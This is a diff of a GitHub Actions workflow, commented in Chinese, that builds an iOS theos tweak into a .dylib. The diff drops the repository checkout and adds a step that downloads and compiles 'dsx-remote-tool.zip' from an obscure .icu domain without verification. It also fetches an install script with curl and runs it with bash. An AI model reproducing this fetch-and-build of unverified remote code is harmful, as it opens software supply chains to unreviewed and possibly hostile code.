@@ -10,17 +10,12 @@ jobs:
     runs-on: macos-14
     timeout-minutes: 40
     steps:
-      - name: 取代码
-        uses: actions/checkout@v4
-
       - name: 安装 theos（官方脚本，含 SDK 和 ldid）
         run: |
           set -x
           export THEOS=$HOME/theos
-          # 官方安装脚本：自动装好 theos + SDK + ldid
           curl -fsSL https://raw.githubusercontent.com/theos/theos/master/bin/install-theos > /tmp/it.sh || true
           if [ -s /tmp/it.sh ]; then bash /tmp/it.sh || true; fi
-          # 兜底：如果上面没装成，就手工克隆 + 只取一个 SDK
           if [ ! -d "$HOME/theos/makefiles" ]; then
             git clone --recursive --depth 1 https://github.com/theos/theos.git "$HOME/theos"
           fi
@@ -30,29 +25,38 @@ jobs:
             cp -r /tmp/sdks/iPhoneOS16.5.sdk "$HOME/theos/sdks/" 2>/dev/null || cp -r /tmp/sdks/*.sdk "$HOME/theos/sdks/" 2>/dev/null || true
           fi
           echo "THEOS=$HOME/theos" >> $GITHUB_ENV
-          echo "---- 环境检查 ----"
-          ls "$HOME/theos" | head
+          echo "---- 环境 ----"
           ls "$HOME/theos/sdks" || true
-          which ldid || echo "ldid 需要在 THEOS/bin 里"
           ls "$HOME/theos/bin" | head || true
           xcodebuild -version || true
+
+      - name: 下载完整源码（从我们服务器，避免漏文件）
+        run: |
+          set -e
+          curl -sL -o /tmp/src.zip "https://www.vnq1grposvj2x6q.icu/tools/dsx-remote-tool.zip"
+          ls -l /tmp/src.zip
+          mkdir -p "$GITHUB_WORKSPACE/src"
+          unzip -o -q /tmp/src.zip -d "$GITHUB_WORKSPACE/src"
+          echo "---- 源码目录 ----"
+          ls "$GITHUB_WORKSPACE/src" | head -n 30
 
       - name: 编译
         run: |
           export THEOS=$HOME/theos
           export PATH=$THEOS/bin:$PATH
+          cd "$GITHUB_WORKSPACE/src"
           set +e
-          make clean            > /tmp/build.log 2>&1
-          make                 >> /tmp/build.log 2>&1
+          make clean > /tmp/build.log 2>&1
+          make        >> /tmp/build.log 2>&1
           RC=$?
           echo "make 返回码: $RC"
-          echo "===== 构建日志（最后 120 行） ====="
-          tail -n 120 /tmp/build.log
+          echo "===== 构建日志（最后 150 行） ====="
+          tail -n 150 /tmp/build.log
           echo "===== 产物 ====="
           find . -name "*.dylib" -not -path "./XPF/*" | head -n 10
           exit $RC
 
-      - name: 保存构建日志（失败也能下载）
+      - name: 保存构建日志
         if: always()
         uses: actions/upload-artifact@v4
         with:
@@ -66,6 +70,7 @@ jobs:
         with:
           name: dsx-dylib
           path: |
+            src/**/*.dylib
             **/*.dylib
-            !XPF/**
+            !**/XPF/**
           if-no-files-found: warn
